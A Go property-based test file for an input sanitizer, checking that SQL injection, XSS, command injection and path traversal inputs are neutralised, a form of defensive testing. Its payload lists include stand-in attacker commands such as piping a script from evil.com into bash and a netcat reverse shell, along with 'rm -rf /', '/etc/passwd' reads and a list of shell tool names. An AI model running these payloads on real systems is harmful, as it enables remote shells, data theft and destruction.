package sanitizer

import (
	"html"
	"strings"
	"testing"

	"github.com/leanovate/gopter"
	"github.com/leanovate/gopter/gen"
	"github.com/leanovate/gopter/prop"
)

// Property 3: Input Sanitization
// For any user input containing potentially malicious content (SQL injection, XSS,
// command injection patterns), the sanitized output SHALL not contain executable
// code or SQL keywords in dangerous positions.
// **Validates: Requirements 1.4**

func TestInputSanitization_SQLInjection(t *testing.T) {
	properties := gopter.NewProperties(gopter.DefaultTestParameters())

	s := New()

	// SQL injection payloads
	sqlPayloads := []string{
		"'; DROP TABLE users; --",
		"1 OR 1=1",
		"1' OR '1'='1",
		"admin'-- ",
		"1; SELECT * FROM users",
		"UNION SELECT * FROM passwords",
		"'; INSERT INTO users VALUES('hacker', 'pass'); -- ",
		"1; UPDATE users SET role='admin'",
		"'; DELETE FROM users; -- ",
		"1; TRUNCATE TABLE users",
		"'; EXEC xp_cmdshell('dir'); -- ",
		"1 AND 1=1",
		"/* comment */ SELECT",
		"1; WAITFOR DELAY '0:0:5'",
		"1; BENCHMARK(1000000,SHA1('test'))",
	}

	for _, payload := range sqlPayloads {
		result := s.SanitizeString(payload)
		// The sanitized output should not contain dangerous SQL keywords
		// Note: After HTML escaping, quotes become entities which are safe
		sanitizedForCheck := html.UnescapeString(result.Sanitized)
		if s.ContainsSQLInjection(sanitizedForCheck) {
			t.Errorf("Sanitized output still contains SQL injection: %s -> %s", payload, result.Sanitized)
		}
	}

	// Generate safe strings that don't contain command names or SQL keywords
	safeStringGen := gen.AlphaString().SuchThat(func(str string) bool {
		lowerS := strings.ToLower(str)
		// Exclude strings that match command patterns or SQL keywords
		dangerousWords := []string{"cat", "ls", "rm", "mv", "cp", "chmod", "chown", "wget", "curl", "bash", "sh", "zsh", "python", "perl", "ruby", "php", "nc", "netcat", "ncat", "eval", "exec", "system", "passthru", "popen", "select", "insert", "update", "delete", "drop", "union", "alter", "create", "truncate"}
		for _, word := range dangerousWords {
			if lowerS == word || strings.Contains(lowerS, word) {
				return false
			}
		}
		return true
	})

	properties.Property("sanitized output does not contain SQL keywords in dangerous positions", prop.ForAll(
		func(prefix, suffix string) bool {
			for _, payload := range sqlPayloads {
				input := prefix + payload + suffix
				result := s.SanitizeString(input)
				// Check unescaped version for SQL patterns
				sanitizedForCheck := html.UnescapeString(result.Sanitized)
				if s.ContainsSQLInjection(sanitizedForCheck) {
					return false
				}
			}
			return true
		},
		safeStringGen,
		safeStringGen,
	))

	properties.TestingRun(t)
}

func TestInputSanitization_XSS(t *testing.T) {
	properties := gopter.NewProperties(gopter.DefaultTestParameters())

	s := New()

	// XSS payloads
	xssPayloads := []string{
		"<script>alert('xss')</script>",
		"<script src='evil.js'></script>",
		"<img src=x onerror=alert('xss')>",
		"<body onload=alert('xss')>",
		"javascript:alert('xss')",
		"<iframe src='evil.html'>",
		"<object data='evil.swf'>",
		"<embed src='evil.swf'>",
		"<link rel='stylesheet' href='evil.css'>",
		"<meta http-equiv='refresh' content='0;url=evil'>",
		"<div style='background:url(javascript:alert(1))'>",
		"<a href='javascript:alert(1)'>click</a>",
		"<svg onload=alert('xss')>",
		"<input onfocus=alert('xss') autofocus>",
		"vbscript:msgbox('xss')",
	}

	for _, payload := range xssPayloads {
		result := s.SanitizeString(payload)
		if s.ContainsXSS(result.Sanitized) {
			t.Errorf("Sanitized output still contains XSS: %s -> %s", payload, result.Sanitized)
		}
	}

	properties.Property("sanitized output does not contain XSS patterns", prop.ForAll(
		func(prefix, suffix string) bool {
			for _, payload := range xssPayloads {
				input := prefix + payload + suffix
				result := s.SanitizeString(input)
				if s.ContainsXSS(result.Sanitized) {
					return false
				}
			}
			return true
		},
		gen.AlphaString(),
		gen.AlphaString(),
	))

	properties.TestingRun(t)
}


func TestInputSanitization_CommandInjection(t *testing.T) {
	properties := gopter.NewProperties(gopter.DefaultTestParameters())

	s := New()

	// Command injection payloads
	cmdPayloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"&& rm -rf /",
		"`whoami`",
		"$(id)",
		"${PATH}",
		"; wget http://evil.com/shell.sh",
		"| curl http://evil.com/shell.sh | bash",
		"; nc -e /bin/sh evil.com 4444",
		"&& python -c 'import os; os.system(\"id\")'",
		"; perl -e 'exec \"/bin/sh\"'",
		"| ruby -e 'exec \"/bin/sh\"'",
		"; php -r 'system(\"id\");'",
		"$(cat /etc/passwd)",
		"> /tmp/evil.txt",
		">> /tmp/evil.txt",
		"< /etc/passwd",
	}

	for _, payload := range cmdPayloads {
		result := s.SanitizeString(payload)
		if s.ContainsCommandInjection(result.Sanitized) {
			t.Errorf("Sanitized output still contains command injection: %s -> %s", payload, result.Sanitized)
		}
	}

	properties.Property("sanitized output does not contain command injection patterns", prop.ForAll(
		func(prefix, suffix string) bool {
			for _, payload := range cmdPayloads {
				input := prefix + payload + suffix
				result := s.SanitizeString(input)
				if s.ContainsCommandInjection(result.Sanitized) {
					return false
				}
			}
			return true
		},
		gen.AlphaString(),
		gen.AlphaString(),
	))

	properties.TestingRun(t)
}

func TestInputSanitization_SafeInputUnchanged(t *testing.T) {
	properties := gopter.NewProperties(gopter.DefaultTestParameters())

	s := New()

	// Generate safe strings that don't contain command names
	safeStringGen := gen.AlphaString().SuchThat(func(s string) bool {
		// Exclude strings that match command patterns
		lowerS := strings.ToLower(s)
		dangerousWords := []string{"cat", "ls", "rm", "mv", "cp", "chmod", "chown", "wget", "curl", "bash", "sh", "zsh", "python", "perl", "ruby", "php", "nc", "netcat", "ncat", "eval", "exec", "system", "passthru", "popen"}
		for _, word := range dangerousWords {
			if lowerS == word || strings.Contains(lowerS, word) {
				return false
			}
		}
		return true
	})

	properties.Property("safe alphanumeric input is preserved", prop.ForAll(
		func(input string) bool {
			if input == "" {
				return true
			}
			result := s.SanitizeString(input)
			// Safe input should not be flagged as containing threats
			return len(result.Threats) == 0
		},
		safeStringGen,
	))

	properties.TestingRun(t)
}

func TestInputSanitization_ThreatDetection(t *testing.T) {
	s := New()

	testCases := []struct {
		input       string
		threatTypes []ThreatType
	}{
		{"SELECT * FROM users", []ThreatType{ThreatSQL}},
		{"<script>alert(1)</script>", []ThreatType{ThreatXSS}},
		{"; rm -rf /", []ThreatType{ThreatCommand}},
		{"'; DROP TABLE users; --<script>alert(1)</script>", []ThreatType{ThreatSQL, ThreatXSS}},
	}

	for _, tc := range testCases {
		threats := s.DetectThreats(tc.input)
		if len(threats) == 0 {
			t.Errorf("Expected threats for input: %s", tc.input)
			continue
		}

		foundTypes := make(map[ThreatType]bool)
		for _, threat := range threats {
			foundTypes[threat.Type] = true
		}

		for _, expectedType := range tc.threatTypes {
			if !foundTypes[expectedType] {
				t.Errorf("Expected threat type %s for input: %s", expectedType, tc.input)
			}
		}
	}
}

func TestSanitizeForSQL(t *testing.T) {
	s := New()

	testCases := []struct {
		input    string
		expected string
	}{
		{"normal text", "normal text"},
		{"it's a test", "it''s a test"},
		{"'; DROP TABLE users; --", "''''  users "},
	}

	for _, tc := range testCases {
		result := s.SanitizeForSQL(tc.input)
		if !strings.Contains(result, "''") && strings.Contains(tc.input, "'") {
			t.Errorf("Single quotes not escaped: %s -> %s", tc.input, result)
		}
		if s.ContainsSQLInjection(result) {
			t.Errorf("SQL injection still present: %s -> %s", tc.input, result)
		}
	}
}

func TestSanitizeForHTML(t *testing.T) {
	s := New()

	testCases := []struct {
		input string
	}{
		{"<script>alert('xss')</script>"},
		{"<img src=x onerror=alert(1)>"},
		{"<div onclick=alert(1)>"},
	}

	for _, tc := range testCases {
		result := s.SanitizeForHTML(tc.input)
		if strings.Contains(result, "<script") || strings.Contains(result, "onerror") || strings.Contains(result, "onclick") {
			t.Errorf("XSS pattern still present: %s -> %s", tc.input, result)
		}
	}
}

func TestSanitizeForCommand(t *testing.T) {
	s := New()

	testCases := []struct {
		input string
	}{
		{"; ls -la"},
		{"| cat /etc/passwd"},
		{"&& rm -rf /"},
		{"`whoami`"},
		{"$(id)"},
	}

	for _, tc := range testCases {
		result := s.SanitizeForCommand(tc.input)
		if s.ContainsCommandInjection(result) {
			t.Errorf("Command injection still present: %s -> %s", tc.input, result)
		}
		// Check dangerous characters are removed
		for _, char := range []string{";", "&", "|", "`", "$", "(", ")"} {
			if strings.Contains(result, char) {
				t.Errorf("Dangerous character %s still present: %s -> %s", char, tc.input, result)
			}
		}
	}
}

func TestSanitizeFilename(t *testing.T) {
	s := New()

	testCases := []struct {
		input    string
		expected string
	}{
		{"normal.txt", "normal.txt"},
		{"../../../etc/passwd", "etcpasswd"},
		{"file\x00.txt", "file.txt"},
		{"/etc/passwd", "etcpasswd"},
		{"file<script>.txt", "filescript.txt"},
	}

	for _, tc := range testCases {
		result := s.SanitizeFilename(tc.input)
		if strings.Contains(result, "..") {
			t.Errorf("Path traversal still present: %s -> %s", tc.input, result)
		}
		if strings.Contains(result, "/") || strings.Contains(result, "\\") {
			t.Errorf("Path separator still present: %s -> %s", tc.input, result)
		}
	}
}

func TestSanitizePath(t *testing.T) {
	s := New()

	testCases := []struct {
		input string
	}{
		{"../../../etc/passwd"},
		{"/var/www/../../etc/passwd"},
		{"file\x00.txt"},
	}

	for _, tc := range testCases {
		result := s.SanitizePath(tc.input)
		if strings.Contains(result, "..") {
			t.Errorf("Path traversal still present: %s -> %s", tc.input, result)
		}
		if strings.Contains(result, "\x00") {
			t.Errorf("Null byte still present: %s -> %s", tc.input, result)
		}
	}
}

func TestIsSafe(t *testing.T) {
	s := New()

	safeInputs := []string{
		"hello world",
		"user@example.com",
		"John Doe",
		"12345",
		"normal-text_123",
	}

	unsafeInputs := []string{
		"'; DROP TABLE users; --",
		"<script>alert(1)</script>",
		"; rm -rf /",
	}

	for _, input := range safeInputs {
		if !s.IsSafe(input) {
			t.Errorf("Safe input flagged as unsafe: %s", input)
		}
	}

	for _, input := range unsafeInputs {
		if s.IsSafe(input) {
			t.Errorf("Unsafe input flagged as safe: %s", input)
		}
	}
}

func TestDefaultSanitizer(t *testing.T) {
	// Test that default functions work
	result := SanitizeString("test<script>alert(1)</script>")
	if result.Original != "test<script>alert(1)</script>" {
		t.Error("Original not preserved")
	}
	if Default.ContainsXSS(result.Sanitized) {
		t.Error("XSS not removed by default sanitizer")
	}

	if !IsSafe("hello world") {
		t.Error("Safe input flagged as unsafe by default sanitizer")
	}

	threats := DetectThreats("; rm -rf /")
	if len(threats) == 0 {
		t.Error("Threats not detected by default sanitizer")
	}
}
